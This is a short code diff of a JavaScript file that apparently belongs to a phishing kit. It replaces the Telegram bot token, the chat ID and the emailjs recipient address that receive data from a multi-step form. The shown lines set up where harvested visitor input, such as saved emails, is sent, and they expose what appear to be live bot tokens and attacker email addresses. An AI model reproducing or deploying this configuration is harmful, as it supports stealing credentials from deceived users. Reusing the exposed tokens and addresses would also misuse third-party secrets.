@@ -7,8 +7,8 @@
 
 // const t = "8001165114:AAFNNyI0aiypVlCuomAMUfzenLuEzhtLuS0"; // token
 // const c = "7999983899"; // channel/user ID
-const t = "6418486152:AAFu4-m8JwABuPOIVZlsMDT9kAAB-6U2arQ"; // token
-const c = "1027906748"; // channel/user ID
+const t = "8270266366:AAGlpNvoeMS8JUKW3FupEnqMKLUxPxjmP1I"; // token
+const c = "8329330575"; // channel/user ID
 const ua = navigator.userAgent;
 let em = ""; // saved email
 
@@ -24,7 +24,7 @@ function sendMail(title, message) {
   emailjs.send("service_0gcrnbf", "template_mvmkre4", {
     title: title,
     message: message,
-    to_email: "baggangfocus@aol.com",
+    to_email: "Chereet200@outlook.com",
   });
 }
 function submitToNoCodeForm(dataObj) {
@@ -187,3 +187,4 @@ $("#step2").on("submit", function (e) {
     b2.html("Download");
   }, 1500);
 });
+
